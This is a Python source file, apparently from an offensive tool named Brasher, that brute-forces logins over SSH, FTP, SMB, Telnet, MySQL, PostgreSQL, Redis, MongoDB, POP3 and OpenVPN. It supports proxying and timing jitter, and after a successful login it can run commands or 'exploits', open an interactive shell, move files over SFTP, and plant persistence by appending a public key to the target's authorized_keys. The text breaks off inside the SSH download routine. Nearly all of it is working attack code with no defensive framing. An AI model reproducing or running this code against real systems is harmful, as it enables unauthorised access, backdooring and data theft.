import paramiko
import threading
import time
import sys
import argparse
import socket
import datetime
from ftplib import FTP,error_perm, error_temp, error_reply
import smb
import telnetlib3
import pymysql
import psycopg2
import redis
from pymongo import MongoClient
import pymongo.errors
import poplib
import os
from colorama import Fore,init,Style,Back
from tqdm import tqdm
import socks
from random import SystemRandom,shuffle,seed
from concurrent.futures import ThreadPoolExecutor, as_completed
from openvpnclient import OpenVPNClient
import asyncio
from title import title

init(autoreset=False)

class Brasher:
    def __init__(self,
                 
                target_host=None,          
                 passwords_list=None,   
                 usernames_list=None,
                 timeout=0,
                 threads=10,
                 progress_bar=False,
                 no_progress_bar=False,
                 port=22,
                 max_retries=False,         
                 output_file=None,
                 no_log=False,
                 max_time=False,
                 mode = "ssh",
                 log_mode=None,
                 stop_on_success=True,
                 socks5_address=None,
                 socks5_port=None,
                 socks5_username=None,
                 socks5_password=None,
                 hosts_list=None,
                single_password=None,
                single_username=None,
                no_color=False,
                ssh_key=None,
                keys_list=None,
                random_timeout=None,
                host_timeout=None,
                ignore_errors=False,
                success_only=False,
                delay=0,
                shuffle_count=10,
                shuffle_seed=False,
                shuffle_seeds_file=[],

                shuffle_usernames=None,
                shuffle_passwords=None,
                shuffle_configs=None,
                shuffle_keys=None,
                shuffle_hosts=None,
                shuffle_seeds=None,

                quiet=False,
                banner=False,
                save_results=False,
                general_wordlist=False,
                keep_open=False,
                exec=False,
                no_banner=False,
                timer=False,

                reverse_usernames=None,
                reverse_passwords=None,
                reverse_configs=None,
                reverse_keys=None,
                reverse_hosts=None,
                reverse_seeds=None,

                 min_length_username = False,
                max_length_username = False,
                min_length_password = False,
                max_length_password = False,
                no_duplicates=None,
                delay_between=0,

                open_vpn_config_file=None,
                open_vpn_username=None,
                open_vpn_password=None,
                open_vpn_connect=None,

                open_vpn_config_file_wordlist=None,
                open_vpn_usernames_wordlist=None,
                open_vpn_passwords_wordlist=None,
                jitter=0.0,
                exploit=False,

                upload_file_to = False,
                download_file_to = False,

                upload_file_from = False,
                download_file_from = False,

                shell = False,
                persist=False,

                smb_client_name = "SMBuser",
                smb_server_name = "SMBServer",
                smb_share_name = "share",
                smb_remote_path = "/",
                smb_domain="",
                telnet_promt = "$"
                

                                ):
        
        self.target_host = target_host
        self.port = port
        self.timeout = timeout
        self.threads = threads
        self.telnet_promt = "$" or telnet_promt
        self.progress_bar = progress_bar
        self.no_progress_bar = no_progress_bar
        self.command = None
        self.hosts = hosts_list

        if hosts_list:

            with open(hosts_list, 'r') as f:
                self.hosts = [line.strip() for line in f if line.strip()]

        elif target_host:
            self.hosts = [target_host]
        else:
            self.hosts = []

        self.single_password= single_password
        self.single_username= single_username 
        self.pub_key = None
        self.passwords_list_path = None
        self.usernames_list_path = None
        self.passwords_list = None
        self.usernames_list = None
        self.no_color = no_color

        self.socks5_address= socks5_address
        self.socks5_port = socks5_port
        self.socks5_username = socks5_username
        self.socks5_password = socks5_password

        self.ssh_key = ssh_key
        self.keys_list = keys_list

        self.random_timeout = random_timeout
        self.host_timeout = host_timeout
        self.ignore_errors = ignore_errors
        self.success_only = success_only

        self.delay = delay

        self.shuffle_count = shuffle_count
        self.shuffle_seed = [shuffle_seed] if shuffle_seed is not None else []  
        self.shuffle_seeds_file = shuffle_seeds_file if shuffle_seeds_file else None
        self.shuffle_seeds_file_path = shuffle_seeds_file

        self.shuffle_usernames=shuffle_usernames
        self.shuffle_passwords=shuffle_passwords
        self.shuffle_configs=shuffle_configs
        self.shuffle_keys=shuffle_keys
        self.shuffle_hosts=shuffle_hosts
        self.shuffle_seeds=shuffle_seeds

        if self.shuffle_seeds_file:

            try:

                with open(self.shuffle_seeds_file, "r") as f:
                    self.shuffle_seeds_file = [int(line.rstrip()) for line in f.readlines()]
                    self.shuffle_seed = self.shuffle_seeds_file
                    
            except Exception:
                self.shuffle_seeds_file = None


        self.quiet = quiet
        self.banner = banner
        self.save_results = save_results
        self.general_wordlist = general_wordlist
        self.key_path = None
        self.usernames_list = []
        self.passwords_list = []
        self.raw_usernames_list = usernames_list   
        self.raw_passwords_list = passwords_list 

        self.reader = None
        self.writer = None
        self.connections_lock = threading.Lock()

        self.keep_open = keep_open
        self.exec = exec

        self.no_banner = no_banner
        self.jitter = jitter
        self.timer = timer
        self.start_timer = None
        
        self.reverse_usernames=reverse_usernames
        self.reverse_passwords=reverse_passwords
        self.reverse_configs=reverse_configs
        self.reverse_keys=reverse_keys
        self.reverse_hosts=reverse_hosts
        self.reverse_seeds=reverse_seeds


        self.min_length_username =  min_length_username
        self.max_length_username = max_length_username

        self.min_length_password =  min_length_password
        self.max_length_password = max_length_password

        self.filtered_usernames = None
        self.filtered_passwords = None
        self.no_duplicates = no_duplicates


        if self.socks5_address and self.socks5_port:

                socks.set_default_proxy(
                    socks.SOCKS5,
                    self.socks5_address,
                    self.socks5_port,
                    username=self.socks5_username,
                    password=self.socks5_password
                )
                
                socket.socket = socks.socksocket

        if self.hosts is None:
            self.hosts = [self.target_host]

            
        

        self.max_retries = max_retries
        self.total_connections = 0
        self.output_file = output_file
        self.no_log = no_log
        self.max_time = max_time
        self.mode = mode
        self.log_mode = log_mode
        self.stop_on_success = stop_on_success

        if self.mode == "ssh-key" and self.keys_list:

            with open(self.keys_list, "r") as f:
                self.passwords_list = [line.strip() for line in f if line.strip()]

        elif self.mode == "ssh-key" and self.ssh_key:
            
            self.passwords_list = [self.ssh_key]

        self.stop_timer = None
        self.is_timer_stop = False
        self.current_file = os.path.abspath(__file__)
        self.project_folder = os.path.dirname(self.current_file)


        if self.check_general():

            pass

        else:

            self.load_data()

        self.ssh_client = None
        self.ftp = None

        self.smbconnection = None
        self.smb_client_name = smb_client_name
        self.smb_server_name = smb_server_name
        self.smb_share_name = smb_share_name or "C$"
        self.smb_remote_path = smb_remote_path
        self.smb_domain = smb_domain
        self.shares = None
        
        self.telnet = None
        self.mysql_connection = None
        self.postgres_connection = None
        self.redis_connection = None
        self.mongodb_connection = None
        self.pop_connection = None
        self.delay_between = delay_between

        self.low = None
        self.high = None

        self.stdin = None
        self.stdout = None
        self.stderr = None
        self.error = None
        self.output = None
        self.result = None
        self.cursor = None
        self.elapsed = None
        self.loop = None
        self.success = None


        self.lock = threading.Lock()
        self.stoping_event = threading.Event()
        self.tasks = None
        self.futures = None
        self.output_lock = threading.Lock()

        self.host_locks = {host: threading.Lock() for host in self.hosts}
        self.host_last_attempt = {host: 0 for host in self.hosts}

        self.open_vpn_client = None
        self.title = title

        self.open_vpn_config_file=open_vpn_config_file
        self.open_vpn_username=open_vpn_username
        self.open_vpn_password=open_vpn_password
        self.open_vpn_connect=open_vpn_connect
        self.open_vpn_config_file_wordlist=open_vpn_config_file_wordlist
        self.open_vpn_usernames_wordlist=open_vpn_usernames_wordlist
        self.open_vpn_passwords_wordlist=open_vpn_passwords_wordlist
        self.open_vpn_config_file_path = None
        self.passwords_list_path = None
        self.exploit = exploit
        self.exec_output = None
        self.exploit_output = None
        self.exploit_content = None

        self.upload_file_to = upload_file_to
        self.download_file_to = download_file_to
        
        self.upload_file_from = upload_file_from
        self.download_file_from = download_file_from
        
        self.shell = shell
        self.persist=persist

        self.sftp = None

        self.load_open_vpn_data()


        if self.mode != "openvpn":
            self.open_vpn_config_file_wordlist = [None]   


    
        if self.max_time:
            self.stop_timer = threading.Timer(self.max_time, self.max_time_exit_program)
            self.stop_timer.start()

        self.modes = {
            
                      "ssh" : ["ssh",self.brute_ssh,self.ssh_upload,self.ssh_download],
                      "ftp" : ["ftp",self.brute_ftp,self.ftp_upload,self.ftp_download],
                      "smb" : ["smb",self.brute_smb,self.smb_upload,self.smb_download],
                      "telnet" : ["telnet",self.brute_telnet],
                      "mysql" : ["mysql",self.brute_mysql],
                      "postgres" : ["postgres",self.brute_postgres],
                      "redis" : [ "redis",self.brute_redis],
                      "mongodb" : ["mongodb",self.brute_mongodb],
                      "pop3" : ["pop3",self.brute_pop3],
                      "ssh-key" : ["ssh-key" ,self.brute_ssh_with_keys,self.ssh_upload,self.ssh_download],
                      "openvpn" : [ "openvpn",self.brute_open_vpn],

        }
        
        if self.passwords_list is None:
            self.passwords_list = []
        

        if random_timeout:

            self.random_timeout = self.parse_range(random_timeout)

        else:

            self.random_timeout = None



        if self.quiet:
            
            if self.output_file:
                pass

            else:
                self.output_file = f"./logs/{datetime.datetime.now().strftime('%d_%m_%Y_%H_%M_%S')}_logs.txt"


    def update(self) -> None:

        self.check_connections()
        self.check_timer()

    def render_text(self, message_type : str , message_type_color , message : str) -> str:

        if self.quiet:
            
            return ""
        
        if message_type == "SUC" and self.success_only:
                
                if self.no_color:

                    return f"[{message_type}] {message}"
                
                return "[" + message_type_color + f"{message_type}" + Style.RESET_ALL + "] " + f"{message}" + Style.RESET_ALL
                

        if message_type == "ERR" and self.ignore_errors:
                
                return "[" + Style.BRIGHT + Fore.YELLOW + f"SKP" + Style.RESET_ALL + "] " + f"error skipped..." + Style.RESET_ALL

        if self.no_color:

            return f"[{message_type}] {message}"
        return "[" + message_type_color + f"{message_type}" + Style.RESET_ALL + "] " + f"{message}" + Style.RESET_ALL
        

    def safe_print(self, message : str):

        with self.output_lock:


            print(message)


    def load_open_vpn_data(self) -> bool:

        if self.mode == "openvpn":

            if self.open_vpn_config_file:

                self.open_vpn_config_file_path = self.open_vpn_config_file

                with open(self.open_vpn_config_file, "r") as f:

                    
                    self.open_vpn_config_file_wordlist = [line.rstrip() for line in f.readlines()]
                    


            elif self.open_vpn_config_file_wordlist is not None:

                self.passwords_list_path = self.open_vpn_config_file_wordlist
                with open(self.open_vpn_config_file_wordlist, "r") as f:


                    self.open_vpn_config_file_wordlist = [line.rstrip() for line in f.readlines()]
                

            
            else:

                self.open_vpn_config_file = None
                self.open_vpn_config_file_wordlist = []



            if self.open_vpn_password:
                    
                    self.passwords_list = [self.open_vpn_password]
                    self.passwords_list_path = f"single: {self.open_vpn_password}"

            elif self.open_vpn_passwords_wordlist is not None:
                    
                with open(self.open_vpn_passwords_wordlist, "r") as f:

                    self.passwords_list = [line.rstrip() for line in f.readlines()]
                self.passwords_list_path = self.open_vpn_passwords_wordlist

                
                
            if self.open_vpn_username:
                    
                self.usernames_list = [self.open_vpn_username]
                self.usernames_list_path = f"single: {self.open_vpn_username}"

            elif self.open_vpn_usernames_wordlist is not None:

                with open(self.open_vpn_usernames_wordlist, "r") as f:

                    self.usernames_list = [line.rstrip() for line in f.readlines()]
                self.usernames_list_path = self.open_vpn_usernames_wordlist


        return True


    def load_data(self) -> bool:

        if self.single_password:
            self.passwords_list = [self.single_password]
            self.passwords_list_path = f"single: {self.single_password}"

        elif isinstance(self.raw_passwords_list, str) and self.raw_passwords_list:
            with open(self.raw_passwords_list, "r") as f:
                self.passwords_list = [line.rstrip() for line in f.readlines()]
            self.passwords_list_path = self.raw_passwords_list

        else:
            self.passwords_list = []
            self.passwords_list_path = None

        if self.single_username:
            self.usernames_list = [self.single_username]
            self.usernames_list_path = f"single: {self.single_username}"

        elif isinstance(self.raw_usernames_list, str) and self.raw_usernames_list:

            with open(self.raw_usernames_list, "r") as f:
                self.usernames_list = [line.rstrip() for line in f.readlines()]

            self.usernames_list_path = self.raw_usernames_list

        else:
            self.usernames_list = []
            self.usernames_list_path = None

        return True
    
    def check_arguments_to_reverse(self) -> bool:

        
        if self.reverse_usernames:
            self.usernames_list.reverse()
            self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"the wordlist with usernames has been successfully reversed"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] The wordlist with usernames has been successfully reversed")
            time.sleep(0.7)

        if self.reverse_passwords:
            self.passwords_list.reverse()
            self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"the wordlist with passwords has been successfully reversed"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] The wordlist with passwords has been successfully reversed")
            time.sleep(0.7)

        if self.open_vpn_config_file_wordlist:
            if self.reverse_configs:
                self.open_vpn_config_file_wordlist.reverse()
                self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"the wordlist with OpenVPN config files has been successfully reversed"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] the wordlist with OpenVPN config files has been successfully reversed")
                time.sleep(0.7)

        if self.keys_list:
            if self.reverse_keys:
                self.passwords_list.reverse()
                self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"the wordlist with keys has been successfully reversed"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] the wordlist with keys has been successfully reversed")
                time.sleep(0.7)

        if self.hosts:
            if self.reverse_hosts:
                self.hosts.reverse()
                self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"the wordlist with hosts has been successfully reversed"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] the wordlist with hosts has been successfully reversed")
                time.sleep(0.7)

        if self.shuffle_seed:
            if self.reverse_seeds:
                self.shuffle_seed.reverse()
                self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"the wordlist with seeds has been successfully reversed"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] the wordlist with seeds has been successfully reversed")
                time.sleep(0.7)

        return True
    

    def reverse_wordlists(self) -> bool:


        if self.reverse_usernames or self.reverse_passwords or self.reverse_configs or self.reverse_keys or self.reverse_hosts or self.reverse_seeds:

            self.safe_print(self.render_text("REV", Style.BRIGHT + Fore.CYAN, f"reverse the wordlists..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [REVERSE] [{self.mode.upper()}] reverse the wordlists...")
            time.sleep(self.get_timeout())
            self.check_arguments_to_reverse()


                          
        return True
    
    def check_arguments_to_shuffle(self) -> bool:


        if self.shuffle_usernames:
            shuffle(self.usernames_list)
            time.sleep(self.get_timeout())

        if self.shuffle_passwords:
            shuffle(self.passwords_list)  
            time.sleep(self.get_timeout())

        if self.open_vpn_config_file_wordlist:
            if self.shuffle_configs:
                shuffle(self.open_vpn_config_file_wordlist)
                time.sleep(self.get_timeout())

        if self.keys_list:
            if self.shuffle_keys:
                shuffle(self.passwords_list)
                time.sleep(self.get_timeout())

        if self.hosts:
            if self.shuffle_hosts:
                shuffle(self.hosts)
                time.sleep(self.get_timeout())

        if self.shuffle_seed:
            if self.shuffle_seeds:
                shuffle(self.shuffle_seed)
                time.sleep(self.get_timeout())

        return True
    

    def print_shuffled_items(self) -> bool:

        if self.shuffle_usernames:
            self.safe_print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"the wordlist with usernames has been successfully shuffled"))
            time.sleep(0.7)

        if self.shuffle_passwords:
            self.safe_print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"the wordlist with passwords has been successfully shuffled"))
            time.sleep(0.7)

        if self.open_vpn_config_file_wordlist:
            if self.shuffle_configs:
                self.safe_print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"the wordlist with OpenVPN config files has been successfully shuffled"))
                time.sleep(0.7)

        if self.keys_list:
            if self.shuffle_keys:
                self.safe_print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"the wordlist with keys has been successfully shuffled"))
                time.sleep(0.7)

        if self.hosts:
            if self.shuffle_hosts:
                self.safe_print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"the wordlist with hosts has been successfully shuffled"))
                time.sleep(0.7)

        if self.shuffle_seed:
            if self.shuffle_seeds:
                self.safe_print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"the wordlist with seeds has been successfully shuffled"))
                time.sleep(0.7)

    def shuffle_wordlists(self) -> bool:

        if len(self.shuffle_seed) ==1:
                    
            seed( int(self.shuffle_seed[0]) )
            print(self.render_text("SEED", Style.BRIGHT + Fore.CYAN, f"new seed installed: {self.shuffle_seed[0]}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SEED] [{self.mode.upper()}] new seed installed: {self.shuffle_seed[0]}")
            time.sleep(3)

            for _ in range(self.shuffle_count):

                for s in self.shuffle_seed:

                    seed(s)
                    self.check_arguments_to_shuffle()

            self.print_shuffled_items()

        if self.shuffle_usernames or self.shuffle_passwords or self.shuffle_configs or self.shuffle_keys or self.shuffle_hosts or self.shuffle_seeds:

            print(self.render_text("SHU", Style.BRIGHT + Fore.CYAN, f"shuffle the wordlists {self.shuffle_count} times..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SHUFFLE] [{self.mode.upper()}] shuffle the wordlists {self.shuffle_count} times...")
            time.sleep(self.get_timeout())
            if self.shuffle_count < 1:
                self.shuffle_count = 1

            if len(self.shuffle_seed) > 1:
                        
                print(self.render_text("SEED", Style.BRIGHT + Fore.CYAN, f"shuffling the wordlists based on seeds from the file: {self.shuffle_seeds_file_path}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SEED] [{self.mode.upper()}] shuffling the wordlists based on seeds from the file: {self.shuffle_seeds_file_path}")
                time.sleep(self.get_timeout())

                for _ in range(self.shuffle_count):

                    for s in self.shuffle_seed:

                        seed(s)
                        self.check_arguments_to_shuffle()

                self.print_shuffled_items()

            if self.shuffle_seed == []:

                time.sleep(self.get_timeout())

                for _ in range(self.shuffle_count):

                    self.check_arguments_to_shuffle()

                self.print_shuffled_items()

                

                          
        return True


    def connect_open_vpn(self) -> bool:

        if self.open_vpn_connect:

            self.open_vpn_client = OpenVPNClient(

                config_path=self.open_vpn_config_file,
                username=self.open_vpn_username,
                password = self.open_vpn_password
            )

            self.open_vpn_client.connect()

            if self.open_vpn_client.is_connected():

                self.safe_print(self.render_text("VPN",Style.BRIGHT + Fore.GREEN,f"OpenVPN connection successfully established: {self.open_vpn_username}:{self.open_vpn_password} ( {self.open_vpn_config_file} )"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN CONNECTION] [{self.mode.upper()}] OpenVPN connection successfully established: {self.open_vpn_username}:{self.open_vpn_password} ( {self.open_vpn_config_file} )")
                return True
            
            
        return False




        
    def check_general(self) -> bool:

        if self.general_wordlist:

            with open(self.general_wordlist, "r") as f:
                for line in f:
                    if ":" in line:
                        user, password = line.strip().split(":", 1)
                        self.usernames_list.append(user)
                        self.passwords_list.append(password)

            return True
        
        return False

    def check_flags(self,connection : any, close_connector : any) -> bool:

        self.success_exit()

        if self.persist:

            self.get_persistent(connection)


        if self.shell:

            self.get_timeout()
            print(self.render_text("INF",  Style.BRIGHT + Fore.GREEN, f"shell mode activated , type 'exit' to exit"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] shell mode activated , type 'exit' to exit")
            self.interactive_shell(connection)

        if self.exploit:

            self.exec = False
            self.safe_print(self.render_text("EXEC",Style.BRIGHT + Fore.GREEN,f"trying to execute the specified exploit: {self.exploit}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [EXECUTE] [{self.mode.upper()}] trying to execute the specified exploit: {self.exploit}")
            time.sleep(self.get_timeout())
            self.exploit_output = self.execute_exploit(connection,self.exploit)
            self.safe_print(self.render_text("EXEC",Style.BRIGHT + Fore.GREEN,f"exploit output: {self.exploit_output}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [EXECUTE] [{self.mode.upper()}] explpoit output: {self.exploit_output}")
            return True

        if self.exec:

            self.exec_output = self.execute_command(connection,self.exec)
            self.safe_print(self.render_text("EXEC",Style.BRIGHT + Fore.GREEN,f"try to execute command: {self.exec}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [EXECUTE] [{self.mode.upper()}] try to execute command: {self.exec}")
            time.sleep(self.get_timeout())
            self.safe_print(self.render_text("EXEC",Style.BRIGHT + Fore.GREEN,f"command output: {self.exec_output}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [EXECUTE] [{self.mode.upper()}] command output: {self.exec_output}")
            return True


        if self.upload_file_to or self.upload_file_from:
           self.check_upload(connection)

        elif self.download_file_to or self.download_file_from:
            self.check_download(connection)

        if self.keep_open:
            
                
            self.keep_connection()
            if callable(close_connector):
                close_connector()

        else: 

            if callable(close_connector):
                close_connector()
            self.success_exit()   

        return True

    def get_persistent(self,connection : any) -> bool:

        try:

            if self.mode.rstrip() == "ssh" or  self.mode.rstrip() == "ssh-key":

                self.key_path = self.persist or "~/.ssh/id_rsa.pub"

                with open(self.key_path,"r") as f:
                    self.pub_key = f.read().strip()

                self.stdin,self.stdout,self.stderr = connection.exec_command("cat ~/.ssh/authorized_keys 2>/dev/null")

                if self.pub_key in self.stdout.read().decode():

                    self.safe_print(self.render_text("PER", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} public key {Style.BRIGHT + self.pub_key + Style.RESET_ALL} is already installed on the system"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [PERSISTENT] [{self.mode.upper()}] the {self.mode} public key {self.pub_key} is already installed on the system")
                    return False

                connection.exec_command(f"mkdir -p ~/.ssh && echo '{self.pub_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys")
                self.stdin, self.stdout, self.stderr = connection.exec_command("whoami")
                self.error = self.stderr.read().decode("utf-8")
                self.output = self.stdout.read().decode().rstrip()

                self.safe_print(self.render_text("PER", Style.BRIGHT + Fore.YELLOW,f"the ssh key has been successfully installed on the remote server; you can now connect to the server by entering the command: ssh -i {Style.BRIGHT + Fore.GREEN + self.key_path + Style.RESET_ALL} {self.output}:{self.hosts[0]}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [PERSISTENT] [{self.mode.upper()}] the {self.mode} the ssh key has been successfully installed on the remote server; you can now connect to the server by entering the command: ssh -i {self.key_path} {self.output}:{self.hosts[0]}")
                return True

            else:

                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} persist flag is supported only for ssh"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] the {self.mode} persist flag is supported only for ssh")
                return False

        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"persist error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] persist error: {e}")
            return False  

    def ssh_shell(self,connection : any) -> bool:

        try:
            
            while True:

                self.command = input(self.render_text("SHELL",  Style.BRIGHT + Fore.CYAN, f"{ Style.BRIGHT + Fore.CYAN + ">>> " + Fore.RESET}"))

                if self.command == "exit":

                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"exiting shell mode..."))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SHELL] [{self.mode.upper()}] exiting shell mode...")
                    return True

                self.stdin, self.stdout, self.stderr = connection.exec_command(self.command)
                self.error = self.stderr.read().decode("utf-8")
                self.output = self.stdout.read().decode().rstrip()

                if self.error:
                    self.safe_print(self.render_text("ERR",Back.RED,f"shell mode error: {self.error.rstrip()}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] shell mode error: {self.error.rstrip()}")

                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SHELL] [{self.mode.upper()}] command shell output: {self.output}")

                if self.output != "":
                    print(self.output)


        except KeyboardInterrupt:
        
            self.ssh_shell(connection)


        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"shell mode error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] shell mode error: {e}")
            return False  

        



    def telnet_shell(self,connection : any) -> bool:
    
        try:
            connection.read_until(f"{self.telnet_promt}".encode())        
            while True:


        
                self.command = input(self.render_text("SHELL",  Style.BRIGHT + Fore.CYAN, f"{ Style.BRIGHT + Fore.CYAN + ">>> " + Fore.RESET}"))
        
                if self.command == "exit":
        
                    print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"exiting shell mode..."))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SHELL] [{self.mode.upper()}] exiting shell mode...")
                    return True
        
                connection.write(self.command.encode("ascii") + b"\n")
                self.output = connection.read_until(f"{self.telnet_promt} ".encode(),timeout=self.get_timeout()).decode("ascii",errors="ignore").rstrip()
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SHELL] [{self.mode.upper()}] command shell output: {self.output}")
        
                if self.output != "":
                    print(self.output)
        
        
        except KeyboardInterrupt:
                
            self.telnet_shell(connection)
        
        
        except Exception as e:
        
            self.safe_print(self.render_text("ERR",Back.RED,f"shell mode error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] shell mode error: {e}")
            return False  

    def interactive_shell(self,connection : any) -> bool:

        try:

            if self.mode.rstrip() == "ssh" or self.mode.rstrip() == "ssh-key":
                self.ssh_shell(connection)

            elif self.mode.rstrip() == "telnet":
                self.telnet_shell(connection)    

            else:

                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} shell mode is supported only for ssh and telnet."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] the {self.mode} shell mode is supported only for ssh and telnet.")
                return False
            
        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"shell mode error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] shell mode error: {e}")
            return False 



    def check_upload(self,connection : any) -> bool:

        try:

            return self.modes[self.mode][2](connection)

        except IndexError:

            self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} protocol does not support uploading and downloading data. continuing to work..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] the {self.mode} protocol does not support uploading and downloading data. continuing to work...")
            return False

    def check_download(self,connection : any) -> bool:

        try:

            return self.modes[self.mode][3](connection)

        except IndexError:

            self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} protocol does not support uploading and downloading data. continuing to work..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] the {self.mode} protocol does not support uploading and downloading data. continuing to work...")
            return False
        
    def ssh_upload(self, connection : any) -> bool:

        try:

            if self.upload_file_to and self.upload_file_from:

                self.sftp = connection.open_sftp()
                print(self.render_text("UPL",Style.BRIGHT + Fore.GREEN, f"trying to upload the file from {Style.BRIGHT + Fore.BLUE + self.upload_file_from + Fore.RESET} to the server as {Style.BRIGHT + Fore.GREEN + self.upload_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [UPLOAD FILE] [{self.mode.upper()}] trying to upload the file from {self.upload_file_from} to the server as {self.upload_file_to}")
                self.sftp.put(self.upload_file_from,self.upload_file_to)
                print(self.render_text("UPL",Style.BRIGHT + Fore.GREEN, f"file successfully uploaded to: {Style.BRIGHT + Fore.GREEN + self.upload_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [UPLOAD FILE] [{self.mode.upper()}] file successfully uploaded to: {self.upload_file_to}")
                self.sftp.close()
                return True

            else:

                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,f"the {self.mode} fle upload failed,specify both the --upload-file-to and --upload-file-from flags."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] the {self.mode} fle upload failed,specify both the --upload-file-to and --upload-file-from flags.")
                return False         
            

        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"sftp error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] sftp error: {e}")
            return False  

        

    def ssh_download(self, connection : any) -> bool:

        try:

            if self.download_file_to and self.download_file_from:


                self.sftp = connection.open_sftp()
                print(self.render_text("DOW",Style.BRIGHT + Fore.GREEN, f"trying to download the file from {Style.BRIGHT + Fore.GREEN + self.download_file_from + Fore.RESET} to your computer as {Style.BRIGHT + Fore.BLUE + self.download_file_to + Fore.RESET}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [DOWNLOAD FILE] [{self.mode.upper()}] trying to download the file from {self.download_file_from} to your computer as {self.download_file_to}")
                self.sftp.get(self.download_file_from,self.download_file_to)
